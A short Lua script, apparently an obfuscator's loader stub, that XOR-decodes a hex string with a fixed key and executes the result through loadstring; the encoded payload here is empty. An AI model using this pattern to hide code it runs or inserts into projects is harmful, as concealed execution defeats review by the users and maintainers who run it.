local k={255,7,78,93,132,214,8,147,88,91,231,32,96,95,14,199,17,242,33,224,141,59,135,105,7,68,140,70,80,252,213,48}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
